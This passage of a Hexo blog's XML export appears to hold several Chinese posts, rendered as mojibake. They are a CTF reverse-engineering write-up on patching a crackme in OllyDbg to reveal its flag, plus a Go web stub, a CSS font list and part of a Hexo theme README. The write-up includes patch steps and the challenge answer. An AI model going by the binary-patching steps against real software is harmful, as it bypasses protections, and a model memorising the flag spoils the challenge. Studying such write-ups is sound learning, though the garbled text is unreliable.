sub_4015F2(2, 1);  if ( dword_4A32C4 == 2 )    sub_4015F2(2, 1);  if ( dword_4A32C4 == 3 )    sub_4015F2(2, 1);  if ( dword_4A32C4 == 4 )    sub_4015F2(2, 1);  if ( dword_4A32C4 == 5 )    sub_4015F2(2, 1);  result = dword_4A32C4 &gt; 5 &amp;&amp; dword_4A32C4 &lt; 18;//ä¸éš¾å‘ç°è¿™ä¸ªæ˜¯åˆ¤æ–­flag{}æ‹¬å·é‡Œçš„å­—ç¬¦æ•°çš„  if ( result )  {    v1 = sub_4015F2(2, 1);    lpMem = (void *)sub_4015F2(1, v1);    result = sub_4015F2(2, 1);    if ( lpMem )      result = sub_4015FE(lpMem);  }  if ( dword_4A32C4 == 18 )    result = sub_4015F2(2, 1);  if ( dword_4A32C4 &gt; 10 ) //è¿™ä¸ªå‡½æ•°æ˜¯æŠŠflagç»™å˜æˆ*****çš„    result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);  ++dword_4A32C4;  return result;}</code></pre><p>è¯´å®è¯ä¸€å¼€å§‹çœŸæ²¡çœ‹æ‡‚ï¼Œç­‰åˆ°æˆ‘ç”¨ODåšå‡º</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{55381</code></pre><p>æˆ‘æ‰çŸ¥é“è¿™ä¸ªå‡½æ•°æ˜¯å¹²ä»€ä¹ˆçš„</p><p>æ‰¾åˆ°å‡½æ•°çš„åˆ¤æ–­ç‚¹å,è¿›å…¥ODè°ƒè¯•</p><pre class=" language-lang-txt"><code class="language-lang-txt">text:00401300                 cmp     dword_4A32C0, 3E8h</code></pre><p>çœ‹åˆ°åˆ¤æ–­ä½ç½®ï¼Œä¸‹æ–­ç‚¹ï¼Œå³é”®å°†æ•°å€¼ä¿®æ”¹ä¸º3E7ï¼ˆä¹Ÿå°±æ˜¯999ï¼‰ï¼Œç„¶ååœ¨ç‚¹å‡»ä¸€ä¸‹</p><p>å°±ä¼šå‡ºæ¥ä¸€ä¸ªflagå­—ç¬¦</p><p>ä½†å½“å­—ç¬¦æ•°è¾¾åˆ°10ä¸ªä»¥ä¸Šçš„æ—¶å€™flagå°±ä¼šå˜æˆ<em>*</em></p><p>çŒœæµ‹</p><pre class=" language-lang-c"><code class="language-lang-c">  if ( dword_4A32C4 &gt; 10 ) //è¿™ä¸ªå‡½æ•°æ˜¯æŠŠflagç»™å˜æˆ*****çš„    result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);  ++dword_4A32C4;</code></pre><p>æ˜¯è¿™ä¸ªå‡½æ•°çš„ä½œç”¨ï¼Œæ‰¾åˆ°æ±‡ç¼–ä»£ç ï¼ŒæŠŠ</p><pre class=" language-lang-txt"><code class="language-lang-txt">.text:00401549                 jle     loc_40156C</code></pre><p>ä¿®æ”¹ä¸º</p><pre class=" language-lang-txt"><code class="language-lang-txt">.text:00401549                 jge     loc_40156C</code></pre><p>ä¹Ÿå°±æ˜¯æŠŠåˆ¤æ–­æ¡ä»¶æ”¹ä¸ºäº†</p><pre class=" language-lang-c"><code class="language-lang-c">dword_4A32C4 &lt; 10</code></pre><p>å› ä¸ºç°åœ¨æˆ‘ä»¬çš„å­—ç¬¦æ•°å·²ç»å¤§äº10äº†ï¼Œæ‰€ä»¥</p><pre class=" language-lang-c"><code class="language-lang-c">result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);</code></pre><p>è¿™ä¸ªå‡½æ•°å°±ä¸ä¼šåœ¨è¿è¡Œ</p><p>å†æŒ‰ä¹‹å‰çš„æ“ä½œèµ°ä¸€é</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{5538189634510}</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go-web</title>
      <link href="/2019/11/08/go-web/go-web/"/>
      <url>/2019/11/08/go-web/go-web/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« -Goä¸-Web-åº”ç”¨"><a href="#ç¬¬ä¸€ç« -Goä¸-Web-åº”ç”¨" class="headerlink" title="ç¬¬ä¸€ç«  Goä¸ Web åº”ç”¨"></a>ç¬¬ä¸€ç«  Goä¸ Web åº”ç”¨</h1><h2 id="1-1-ä½¿ç”¨Go-è¯­è¨€æ„å»ºWeb-åº”ç”¨"><a href="#1-1-ä½¿ç”¨Go-è¯­è¨€æ„å»ºWeb-åº”ç”¨" class="headerlink" title="1.1 ä½¿ç”¨Go è¯­è¨€æ„å»ºWeb åº”ç”¨"></a>1.1 ä½¿ç”¨Go è¯­è¨€æ„å»ºWeb åº”ç”¨</h2><p>â€‹    â€œä¸ºä»€ä¹ˆè¦ä½¿ç”¨Goè¯­è¨€ç¼–å†™webåº”ç”¨â€ï¼ŒGoä½œä¸ºä¸€é—¨æ¯”è¾ƒå¹´è½»çš„ç¼–ç¨‹è¯­è¨€ï¼Œä¸ªäººè®¤ä¸ºæ¯”è¾ƒç¬¦åˆç°ä»£å‘å±•çš„è¶‹åŠ¿ï¼Œå®ƒéå¸¸é€‚åˆç”¨æ¥ç¼–å†™é‚£äº›éœ€è¦å¿«é€Ÿè¿è¡Œçš„æœåŠ¡å™¨ç«¯ç¨‹åºã€‚Goè¯­è¨€æä¾›äº†å¾ˆå¤šè¿‡ç¨‹å¼ç¼–ç¨‹è¯­è¨€çš„ç‰¹æ€§ï¼Œå…¶æä¾›äº†å‡½æ•°å¼ç¼–ç¨‹æ–¹é¢çš„ç‰¹æ€§ï¼Œä»¥åŠç°ä»£åŒ–çš„åŒ…ç®¡ç†ç³»ç»Ÿï¼Œåƒåœ¾æ”¶é›†ç‰¹æ€§ä»¥åŠæ ‡å‡†åº“</p><p>â€‹    åœ¨å¤§è§„æ¨¡çš„Webåº”ç”¨æ–¹é¢ï¼ŒGoæä¾›äº†ä¸€ç§ä¸åŒäºç°æœ‰è¯­è¨€å’Œå¹³å°ä½†åˆåˆ‡å®å¯è¡Œçš„æ–¹æ¡ˆï¼Œå¤§è§„æ¨¡å¯æ‰©å±•çš„Webåº”ç”¨é€šå¸¸éœ€è¦å…·å¤‡ä»¥ä¸‹ç‰¹æ€§ï¼š</p><ul><li>å¯æ‰©å±•æ€§</li><li>æ¨¡å—åŒ–</li><li>å¯ç»´æŠ¤æ€§</li><li>é«˜æ€§èƒ½</li></ul><h3 id="1-1-1-Goä¸å¯æ‰©å±•Webåº”ç”¨"><a href="#1-1-1-Goä¸å¯æ‰©å±•Webåº”ç”¨" class="headerlink" title="1.1.1 Goä¸å¯æ‰©å±•Webåº”ç”¨"></a>1.1.1 Goä¸å¯æ‰©å±•Webåº”ç”¨</h3><p>//çœ‹åˆ°å®ä¾‹åè¡¥å……ï¼Œæš‚æ—¶ä¸åšåˆ†æ</p><h3 id="1-1-2-Go-ä¸æ¨¡å—åŒ–çš„Webåº”ç”¨"><a href="#1-1-2-Go-ä¸æ¨¡å—åŒ–çš„Webåº”ç”¨" class="headerlink" title="1.1.2 Go ä¸æ¨¡å—åŒ–çš„Webåº”ç”¨"></a>1.1.2 Go ä¸æ¨¡å—åŒ–çš„Webåº”ç”¨</h3><p>//çœ‹åˆ°å®ä¾‹åè¡¥å……ï¼Œæš‚æ—¶ä¸åšåˆ†æ</p><h3 id="1-1-3-Go-ä¸å¯ç»´æŠ¤çš„Webåº”ç”¨"><a href="#1-1-3-Go-ä¸å¯ç»´æŠ¤çš„Webåº”ç”¨" class="headerlink" title="1.1.3 Go ä¸å¯ç»´æŠ¤çš„Webåº”ç”¨"></a>1.1.3 Go ä¸å¯ç»´æŠ¤çš„Webåº”ç”¨</h3><p>//çœ‹åˆ°å®ä¾‹åè¡¥å……ï¼Œæš‚æ—¶ä¸åšåˆ†æ</p><h3 id="1-1-4-Goä¸é«˜æ€§èƒ½Webåº”ç”¨"><a href="#1-1-4-Goä¸é«˜æ€§èƒ½Webåº”ç”¨" class="headerlink" title="1.1.4 Goä¸é«˜æ€§èƒ½Webåº”ç”¨"></a>1.1.4 Goä¸é«˜æ€§èƒ½Webåº”ç”¨</h3><p>//çœ‹åˆ°å®ä¾‹åè¡¥å……ï¼Œæš‚æ—¶ä¸åšåˆ†æ</p><h2 id="1-2-Webåº”ç”¨å·¥ä½œåŸç†"><a href="#1-2-Webåº”ç”¨å·¥ä½œåŸç†" class="headerlink" title="1.2 Webåº”ç”¨å·¥ä½œåŸç†"></a>1.2 Webåº”ç”¨å·¥ä½œåŸç†</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Go-web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
            <tag> web </tag>
            
            <tag> åç«¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS-pingfang</title>
      <link href="/2019/11/08/html/css/css-pingfang/"/>
      <url>/2019/11/08/html/css/css-pingfang/</url>
      
        <content type="html"><![CDATA[<h1 id="CSSå¸¸ç”¨çš„è‹¹æ–¹å­—ä½“"><a href="#CSSå¸¸ç”¨çš„è‹¹æ–¹å­—ä½“" class="headerlink" title="CSSå¸¸ç”¨çš„è‹¹æ–¹å­—ä½“"></a>CSSå¸¸ç”¨çš„è‹¹æ–¹å­—ä½“</h1><p>å­—ä½“å¯¹ç½‘é¡µçš„ç¾è§‚æ€§æœ‰æ—¶å€™ä¹Ÿèµ·ç€å¾ˆå…³é”®çš„ä½œç”¨</p><p>ä»¥ä¸‹æ˜¯ä»ç½‘ä¸Šæ”¶é›†åˆ°çš„è‹¹æœçš„è‹¹æ–¹å­—ä½“ï¼ˆè‡ªç”¨ï¼Œä¸å¯å•†ç”¨ï¼Œå­—ä½“æœ‰ç‰ˆæƒï¼ï¼ï¼ï¼‰ï¼š</p><pre class=" language-lang-css"><code class="language-lang-css">// è‹¹æ–¹-ç®€ å¸¸è§„ä½“font-family: PingFangSC-Regular, sans-serif;// è‹¹æ–¹-ç®€ æç»†ä½“font-family: PingFangSC-Ultralight, sans-serif;// è‹¹æ–¹-ç®€ ç»†ä½“font-family: PingFangSC-Light, sans-serif;// è‹¹æ–¹-ç®€ çº¤ç»†ä½“font-family: PingFangSC-Thin, sans-serif;// è‹¹æ–¹-ç®€ ä¸­é»‘ä½“font-family: PingFangSC-Medium, sans-serif;// è‹¹æ–¹-ç®€ ä¸­ç²—ä½“font-family: PingFangSC-Semibold, sans-serif;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexoåšå®¢ä¸»é¢˜ä¹‹hexo-theme-materyçš„ä»‹ç»</title>
      <link href="/2018/09/28/html/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/"/>
      <url>/2018/09/28/html/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/</url>
      
        <content type="html"><![CDATA[<p><a href="README.md">English Document</a> | <a href="https://blinkfox.github.io/" target="_blank" rel="noopener">æ¼”ç¤ºç¤ºä¾‹</a> | QQäº¤æµç¾¤:<code>926552981</code></p><blockquote><p>è¿™æ˜¯ä¸€ä¸ªé‡‡ç”¨<code>Material Design</code>å’Œå“åº”å¼è®¾è®¡çš„ Hexo åšå®¢ä¸»é¢˜ã€‚</p></blockquote><h2 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h2><ul><li>ç®€å•æ¼‚äº®ï¼Œæ–‡ç« å†…å®¹ç¾è§‚æ˜“è¯»</li><li><a href="https://material.io/" target="_blank" rel="noopener">Material Design</a> è®¾è®¡</li><li>å“åº”å¼è®¾è®¡ï¼Œåšå®¢åœ¨æ¡Œé¢ç«¯ã€å¹³æ¿ã€æ‰‹æœºç­‰è®¾å¤‡ä¸Šå‡èƒ½å¾ˆå¥½çš„å±•ç°</li><li>é¦–é¡µè½®æ’­æ–‡ç« åŠæ¯å¤©åŠ¨æ€åˆ‡æ¢ <code>Banner</code> å›¾ç‰‡</li><li>ç€‘å¸ƒæµå¼çš„åšå®¢æ–‡ç« åˆ—è¡¨ï¼ˆæ–‡ç« æ— ç‰¹è‰²å›¾ç‰‡æ—¶ä¼šæœ‰ <code>24</code> å¼ æ¼‚äº®çš„å›¾ç‰‡ä»£æ›¿ï¼‰</li><li>æ—¶é—´è½´å¼çš„å½’æ¡£é¡µ</li><li><strong>è¯äº‘</strong>çš„æ ‡ç­¾é¡µå’Œ<strong>é›·è¾¾å›¾</strong>çš„åˆ†ç±»é¡µ</li><li>ä¸°å¯Œçš„å…³äºæˆ‘é¡µé¢ï¼ˆåŒ…æ‹¬å…³äºæˆ‘ã€æ–‡ç« ç»Ÿè®¡å›¾ã€æˆ‘çš„é¡¹ç›®ã€æˆ‘çš„æŠ€èƒ½ã€ç›¸å†Œç­‰ï¼‰</li><li>å¯è‡ªå®šä¹‰çš„æ•°æ®çš„å‹æƒ…é“¾æ¥é¡µé¢</li><li>æ”¯æŒæ–‡ç« ç½®é¡¶å’Œæ–‡ç« æ‰“èµ</li><li>æ”¯æŒ <code>MathJax</code></li><li><code>TOC</code> ç›®å½•</li><li>å¯è®¾ç½®å¤åˆ¶æ–‡ç« å†…å®¹æ—¶è¿½åŠ ç‰ˆæƒä¿¡æ¯</li><li>å¯è®¾ç½®é˜…è¯»æ–‡ç« æ—¶åšå¯†ç éªŒè¯</li><li><a href="https://gitalk.github.io/" target="_blank" rel="noopener">Gitalk</a>ã€<a href="https://imsun.github.io/gitment/" target="_blank" rel="noopener">Gitment</a>ã€<a href="https://valine.js.org/" target="_blank" rel="noopener">Valine</a> å’Œ <a href="https://disqus.com/" target="_blank" rel="noopener">Disqus</a> è¯„è®ºæ¨¡å—ï¼ˆæ¨èä½¿ç”¨ <code>Gitalk</code>ï¼‰</li><li>é›†æˆäº†<a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">ä¸è’œå­ç»Ÿè®¡</a>ã€è°·æ­Œåˆ†æï¼ˆ<code>Google Analytics</code>ï¼‰å’Œæ–‡ç« å­—æ•°ç»Ÿè®¡ç­‰åŠŸèƒ½</li><li>æ”¯æŒåœ¨é¦–é¡µçš„éŸ³ä¹æ’­æ”¾å’Œè§†é¢‘æ’­æ”¾åŠŸèƒ½</li></ul><h2 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h2><p>å½“ä½ çœ‹åˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œåº”è¯¥å·²ç»æœ‰ä¸€ä¸ªè‡ªå·±çš„ <a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a> åšå®¢äº†ã€‚å¦‚æœè¿˜æ²¡æœ‰çš„è¯ï¼Œä¸å¦¨ä½¿ç”¨ Hexo å’Œ <a href="https://www.appinn.com/markdown/" target="_blank" rel="noopener">Markdown</a> æ¥å†™åšå®¢å’Œæ–‡ç« ã€‚</p><p>ç‚¹å‡» <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master" target="_blank" rel="noopener">è¿™é‡Œ</a> ä¸‹è½½ <code>master</code> åˆ†æ”¯çš„æœ€æ–°ç¨³å®šç‰ˆçš„ä»£ç ï¼Œè§£å‹ç¼©åï¼Œå°† <code>hexo-theme-matery</code> çš„æ–‡ä»¶å¤¹å¤åˆ¶åˆ°ä½  Hexo çš„ <code>themes</code> æ–‡ä»¶å¤¹ä¸­å³å¯ã€‚</p><p>å½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨ä½ çš„ <code>themes</code> æ–‡ä»¶å¤¹ä¸‹ä½¿ç”¨ <code>Git clone</code> å‘½ä»¤æ¥ä¸‹è½½:</p><pre class=" language-lang-bash"><code class="language-lang-bash">git clone https://github.com/blinkfox/hexo-theme-matery.git</code></pre><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><h3 id="åˆ‡æ¢ä¸»é¢˜"><a href="#åˆ‡æ¢ä¸»é¢˜" class="headerlink" title="åˆ‡æ¢ä¸»é¢˜"></a>åˆ‡æ¢ä¸»é¢˜</h3><p>ä¿®æ”¹ Hexo æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> çš„  <code>theme</code> çš„å€¼ï¼š<code>theme: hexo-theme-matery</code></p><h4 id="config-yml-æ–‡ä»¶çš„å…¶å®ƒä¿®æ”¹å»ºè®®"><a href="#config-yml-æ–‡ä»¶çš„å…¶å®ƒä¿®æ”¹å»ºè®®" class="headerlink" title="_config.yml æ–‡ä»¶çš„å…¶å®ƒä¿®æ”¹å»ºè®®:"></a><code>_config.yml</code> æ–‡ä»¶çš„å…¶å®ƒä¿®æ”¹å»ºè®®:</h4><ul><li>è¯·ä¿®æ”¹ <code>_config.yml</code> çš„ <code>url</code> çš„å€¼ä¸ºä½ çš„ç½‘ç«™ä¸» <code>URL</code>ï¼ˆå¦‚ï¼š<code>http://xxx.github.io</code>ï¼‰ã€‚</li><li>å»ºè®®ä¿®æ”¹ä¸¤ä¸ª <code>per_page</code> çš„åˆ†é¡µæ¡æ•°å€¼ä¸º <code>6</code> çš„å€æ•°ï¼Œå¦‚ï¼š<code>12</code>ã€<code>18</code> ç­‰ï¼Œè¿™æ ·æ–‡ç« åˆ—è¡¨åœ¨å„ä¸ªå±å¹•ä¸‹éƒ½èƒ½è¾ƒå¥½çš„æ˜¾ç¤ºã€‚</li><li>å¦‚æœä½ æ˜¯ä¸­æ–‡ç”¨æˆ·ï¼Œåˆ™å»ºè®®ä¿®æ”¹ <code>language</code> çš„å€¼ä¸º <code>zh-CN</code>ã€‚</li></ul><h3 id="æ–°å»ºåˆ†ç±»-categories-é¡µ"><a href="#æ–°å»ºåˆ†ç±»-categories-é¡µ" class="headerlink" title="æ–°å»ºåˆ†ç±» categories é¡µ"></a>æ–°å»ºåˆ†ç±» categories é¡µ</h3><p><code>categories</code> é¡µæ˜¯ç”¨æ¥å±•ç¤ºæ‰€æœ‰åˆ†ç±»çš„é¡µé¢ï¼Œå¦‚æœåœ¨ä½ çš„åšå®¢ <code>source</code> ç›®å½•ä¸‹è¿˜æ²¡æœ‰ <code>categories/index.md</code> æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦æ–°å»ºä¸€ä¸ªï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class=" language-lang-bash"><code class="language-lang-bash">hexo new page "categories"</code></pre><p>ç¼–è¾‘ä½ åˆšåˆšæ–°å»ºçš„é¡µé¢æ–‡ä»¶ <code>/source/categories/index.md</code>ï¼Œè‡³å°‘éœ€è¦ä»¥ä¸‹å†…å®¹ï¼š</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: categoriesdate: 2018-09-30 17:25:30type: "categories"layout: "categories"---</code></pre><h3 id="æ–°å»ºæ ‡ç­¾-tags-é¡µ"><a href="#æ–°å»ºæ ‡ç­¾-tags-é¡µ" class="headerlink" title="æ–°å»ºæ ‡ç­¾ tags é¡µ"></a>æ–°å»ºæ ‡ç­¾ tags é¡µ</h3><p><code>tags</code> é¡µæ˜¯ç”¨æ¥å±•ç¤ºæ‰€æœ‰æ ‡ç­¾çš„é¡µé¢ï¼Œå¦‚æœåœ¨ä½ çš„åšå®¢ <code>source</code> ç›®å½•ä¸‹è¿˜æ²¡æœ‰ <code>tags/index.md</code> æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦æ–°å»ºä¸€ä¸ªï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class=" language-lang-bash"><code class="language-lang-bash">hexo new page "tags"</code></pre><p>ç¼–è¾‘ä½ åˆšåˆšæ–°å»ºçš„é¡µé¢æ–‡ä»¶ <code>/source/tags/index.md</code>ï¼Œè‡³å°‘éœ€è¦ä»¥ä¸‹å†…å®¹ï¼š</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: tagsdate: 2018-09-30 18:23:38type: "tags"layout: "tags"---</code></pre><h3 id="æ–°å»ºå…³äºæˆ‘-about-é¡µ"><a href="#æ–°å»ºå…³äºæˆ‘-about-é¡µ" class="headerlink" title="æ–°å»ºå…³äºæˆ‘ about é¡µ"></a>æ–°å»ºå…³äºæˆ‘ about é¡µ</h3><p><code>about</code> é¡µæ˜¯ç”¨æ¥å±•ç¤º<strong>å…³äºæˆ‘å’Œæˆ‘çš„åšå®¢</strong>ä¿¡æ¯çš„é¡µé¢ï¼Œå¦‚æœåœ¨ä½ çš„åšå®¢ <code>source</code> ç›®å½•ä¸‹è¿˜æ²¡æœ‰ <code>about/index.md</code> æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦æ–°å»ºä¸€ä¸ªï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class=" language-lang-bash"><code class="language-lang-bash">hexo new page "about"</code></pre><p>ç¼–è¾‘ä½ åˆšåˆšæ–°å»ºçš„é¡µé¢æ–‡ä»¶ <code>/source/about/index.md</code>ï¼Œè‡³å°‘éœ€è¦ä»¥ä¸‹å†…å®¹ï¼š</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: aboutdate: 2018-09-30 17:25:30type: "about"layout: "about"---</code></pre><h3 id="æ–°å»ºå‹æƒ…è¿æ¥-friends-é¡µï¼ˆå¯é€‰çš„ï¼‰"><a href="#æ–°å»ºå‹æƒ…è¿æ¥-friends-é¡µï¼ˆå¯é€‰çš„ï¼‰" class="headerlink" title="æ–°å»ºå‹æƒ…è¿æ¥ friends é¡µï¼ˆå¯é€‰çš„ï¼‰"></a>æ–°å»ºå‹æƒ…è¿æ¥ friends é¡µï¼ˆå¯é€‰çš„ï¼‰</h3><p><code>friends</code> é¡µæ˜¯ç”¨æ¥å±•ç¤º<strong>å‹æƒ…è¿æ¥</strong>ä¿¡æ¯çš„é¡µé¢ï¼Œå¦‚æœåœ¨ä½ çš„åšå®¢ <code>source</code> ç›®å½•ä¸‹è¿˜æ²¡æœ‰ <code>friends/index.md</code> æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦æ–°å»ºä¸€ä¸ªï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class=" language-lang-bash"><code class="language-lang-bash">hexo new page "friends"</code></pre><p>ç¼–è¾‘ä½ åˆšåˆšæ–°å»ºçš„é¡µé¢æ–‡ä»¶ <code>/source/friends/index.md</code>ï¼Œè‡³å°‘éœ€è¦ä»¥ä¸‹å†…å®¹ï¼š</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: friendsdate: 2018-12-12 21:25:30type: "friends"layout: "friends"---</code></pre><p>åŒæ—¶ï¼Œåœ¨ä½ çš„åšå®¢ <code>source</code> ç›®å½•ä¸‹æ–°å»º <code>_data</code> ç›®å½•ï¼Œåœ¨ <code>_data</code> ç›®å½•ä¸­æ–°å»º <code>friends.json</code> æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class=" language-lang-json"><code class="language-lang-json">[{    "avatar": "http://image.luokangyuan.com/1_qq_27922023.jpg",    "name": "ç é…±",    "introduction": "æˆ‘ä¸æ˜¯å¤§ä½¬ï¼Œåªæ˜¯åœ¨è¿½å¯»å¤§ä½¬çš„è„šæ­¥",    "url": "http://luokangyuan.com/",    "title": "å‰å»å­¦ä¹ "}, {    "avatar": "http://image.luokangyuan.com/4027734.jpeg",    "name": "é—ªçƒä¹‹ç‹",    "introduction": "ç¼–ç¨‹ç•Œå¤§ä½¬ï¼ŒæŠ€æœ¯ç‰›ï¼Œäººè¿˜ç‰¹åˆ«å¥½ï¼Œä¸æ‡‚çš„éƒ½å¯ä»¥è¯·æ•™å¤§ä½¬",    "url": "https://blinkfox.github.io/",    "title": "å‰å»å­¦ä¹ "}, {    "avatar": "http://image.luokangyuan.com/avatar.jpg",    "name": "ja_rome",    "introduction": "å¹³å‡¡çš„è„šæ­¥ä¹Ÿå¯ä»¥èµ°å‡ºä¼Ÿå¤§çš„è¡Œç¨‹",    "url": "ttps://me.csdn.net/jlh912008548",    "title": "å‰å»å­¦ä¹ "}]</code></pre><h3 id="ä»£ç é«˜äº®"><a href="#ä»£ç é«˜äº®" class="headerlink" title="ä»£ç é«˜äº®"></a>ä»£ç é«˜äº®</h3><p>ç”±äº Hexo è‡ªå¸¦çš„ä»£ç é«˜äº®ä¸»é¢˜æ˜¾ç¤ºä¸å¥½çœ‹ï¼Œæ‰€ä»¥ä¸»é¢˜ä¸­ä½¿ç”¨åˆ°äº† <a href="https://github.com/ele828/hexo-prism-plugin" target="_blank" rel="noopener">hexo-prism-plugin</a> çš„ Hexo æ’ä»¶æ¥åšä»£ç é«˜äº®ï¼Œå®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm i -S hexo-prism-plugin</code></pre><p>ç„¶åï¼Œä¿®æ”¹ Hexo æ ¹ç›®å½•ä¸‹ <code>_config.yml</code> æ–‡ä»¶ä¸­ <code>highlight.enable</code> çš„å€¼ä¸º <code>false</code>ï¼Œå¹¶æ–°å¢ <code>prism</code> æ’ä»¶ç›¸å…³çš„é…ç½®ï¼Œä¸»è¦é…ç½®å¦‚ä¸‹ï¼š</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">highlight:  enable: falseprism_plugin:  mode: 'preprocess'    # realtime/preprocess  theme: 'tomorrow'  line_number: false    # default false  custom_css:</code></pre><h3 id="æœç´¢"><a href="#æœç´¢" class="headerlink" title="æœç´¢"></a>æœç´¢</h3><p>æœ¬ä¸»é¢˜ä¸­è¿˜ä½¿ç”¨åˆ°äº† <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener">hexo-generator-search</a> çš„ Hexo æ’ä»¶æ¥åšå†…å®¹æœç´¢ï¼Œå®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm install hexo-generator-search --save</code></pre><p>åœ¨ Hexo æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ï¼Œæ–°å¢ä»¥ä¸‹çš„é…ç½®é¡¹ï¼š</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">search:  path: search.xml  field: post</code></pre><h3 id="ä¸­æ–‡é“¾æ¥è½¬æ‹¼éŸ³ï¼ˆå¯é€‰çš„ï¼‰"><a href="#ä¸­æ–‡é“¾æ¥è½¬æ‹¼éŸ³ï¼ˆå¯é€‰çš„ï¼‰" class="headerlink" title="ä¸­æ–‡é“¾æ¥è½¬æ‹¼éŸ³ï¼ˆå¯é€‰çš„ï¼‰"></a>ä¸­æ–‡é“¾æ¥è½¬æ‹¼éŸ³ï¼ˆå¯é€‰çš„ï¼‰</h3><p>å¦‚æœä½ çš„æ–‡ç« åç§°æ˜¯ä¸­æ–‡çš„ï¼Œé‚£ä¹ˆ Hexo é»˜è®¤ç”Ÿæˆçš„æ°¸ä¹…é“¾æ¥ä¹Ÿä¼šæœ‰ä¸­æ–‡ï¼Œè¿™æ ·ä¸åˆ©äº <code>SEO</code>ï¼Œä¸” <code>gitment</code> è¯„è®ºå¯¹ä¸­æ–‡é“¾æ¥ä¹Ÿä¸æ”¯æŒã€‚æˆ‘ä»¬å¯ä»¥ç”¨ <a href="https://github.com/viko16/hexo-permalink-pinyin" target="_blank" rel="noopener">hexo-permalink-pinyin</a> Hexo æ’ä»¶ä½¿åœ¨ç”Ÿæˆæ–‡ç« æ—¶ç”Ÿæˆä¸­æ–‡æ‹¼éŸ³çš„æ°¸ä¹…é“¾æ¥ã€‚</p><p>å®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm i hexo-permalink-pinyin --save</code></pre><p>åœ¨ Hexo æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ï¼Œæ–°å¢ä»¥ä¸‹çš„é…ç½®é¡¹ï¼š</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">permalink_pinyin:  enable: true  separator: '-' # default: '-'</code></pre><blockquote><p><strong>æ³¨</strong>ï¼šé™¤äº†æ­¤æ’ä»¶å¤–ï¼Œ<a href="https://github.com/rozbo/hexo-abbrlink" target="_blank" rel="noopener">hexo-abbrlink</a> 